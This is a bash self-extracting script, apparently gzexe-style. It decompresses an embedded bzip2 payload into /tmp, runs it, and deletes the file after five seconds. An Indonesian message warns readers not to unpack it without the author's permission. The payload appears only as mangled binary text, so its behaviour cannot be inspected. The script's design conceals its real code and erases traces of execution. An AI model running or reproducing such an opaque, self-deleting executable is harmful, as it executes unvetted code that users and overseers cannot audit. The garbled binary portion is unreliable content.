#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�v�w =��u����?�������PD@  PLa�̓�ua�͡$�	��S�F��6)�ڦ�I�z�HhmM���G�P�L#D���6�M4�   h b B2jz)�<���i�M�h4 ��4d� �C&�d� � h2h 4  � �I	�cI<��Si�z�M2z44z�� @4� ����WΞj�4}��h�s���]R@��E��q���k1>��m�w����?�:� �7��uc��67E$�a�r+��[VΔ�����k��C������9V��0W��p�����$F���P�f��@�W�3N����h�[3Խ�^U*hҍ���_���y�z���l�Sg��Gً�s���*�Te��k���χ�C�	��p��4ڦ3B���5C's�`�-��b��I��l�э�:ͨݓ=�%�;qY�c)J��p����D;V�W��>(\��e���&h�T�Z����ҽ9�H�4�a�"@�[�mh�#��r�w����1A�:B� 0�r��k�nշ�z�Y;j��0n4C\ ZSxwԈ�q�'U�@*����3xP&���)��	�)�
/�8��|�?c��2��2�Ugq>!�J�)%{#�NJ{o`���q[@�#wI��@��epK���ٲ�u&��6��l�'ʍ+}�����"����3�ܤ��G'⛭��!Ȁũ��B�"�g���F�4���������r$�N��8�r�!u�{�����#<È}��0̈�U�����\�^�H~��y�w�7x7��`��X\u�#&��|����UV�I��PZ���f�F�(/�ވ��e��\@$l�)>X�t�ވf�b@�g�ܼ��&ec4��,������v&"7�5EIYԙLFsP�Q��#�F�L1�j�P����4%��q�־�
�vJ�n�8)��F�H�N0u���!��え��K����;7�PO#��jc����s���!�!l��Z��hj�6d&�&"��ǖ}��Y0���@UF�`Z�0H��]QT8o��ဴ�`����c 3����H�jqvE]R�������Aj(�}g5Y��3,�SSK�<W�*H��R��R�5��r��ő'/w4�J�<�P�^���:ʇ�*m�U�����<	!�Ã�i:ܐ�X�!�Y���
�)��eX�2G�8R�D	�p��r,+��)E%i����Dd�1K�9\^3�uv����\�xjNf��ə>�5-��T1xݠ��V��Q�Nfj�hO�®:���E: ��C�)u*�ũSr��:�jU�DT���.d��W[����\<�vu��&I���_F�L
�fPZ��/�BĤ��F�#h��n�,֧^��9�L$!0K<����X	����"�(HR�h��